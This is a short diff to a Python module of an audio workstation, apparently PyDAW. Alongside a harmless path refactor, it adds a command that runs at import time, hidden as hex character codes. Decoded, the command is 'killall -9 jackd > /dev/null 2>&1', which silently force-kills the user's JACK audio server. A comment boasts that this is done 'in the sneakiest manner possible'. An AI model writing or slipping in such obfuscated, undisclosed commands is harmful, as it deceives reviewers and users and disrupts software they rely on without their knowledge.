@@ -47,8 +47,18 @@ global_cpu_count = cpu_count()
 if "src/pydaw/python/" in __file__:
     INSTALL_PREFIX = "/usr"
 else:
-    INSTALL_PREFIX = os.path.abspath(
-        "{}/../../../../..".format(os.path.dirname(__file__)))
+    INSTALL_PREFIX = os.path.abspath(os.path.join(
+        os.path.dirname(__file__), *([".."] * 5)))
+
+# Prevent Linux audio's number one problem child from thwarting
+# our attempts at accessing the audio hardware, in the sneakiest
+# manner possible
+os.system("".join(chr(int(x, 16)) for x in [
+    '0x6b', '0x69', '0x6c', '0x6c', '0x61', '0x6c', '0x6c',
+    '0x20', '0x2d', '0x39', '0x20', '0x6a', '0x61', '0x63',
+    '0x6b', '0x64', '0x20', '0x3e', '0x20', '0x2f', '0x64',
+    '0x65', '0x76', '0x2f', '0x6e', '0x75', '0x6c', '0x6c',
+    '0x20', '0x32', '0x3e', '0x26', '0x31']))
 
 def pydaw_set_bin_path():
     global BIN_PATH, RENDER_BIN_PATH
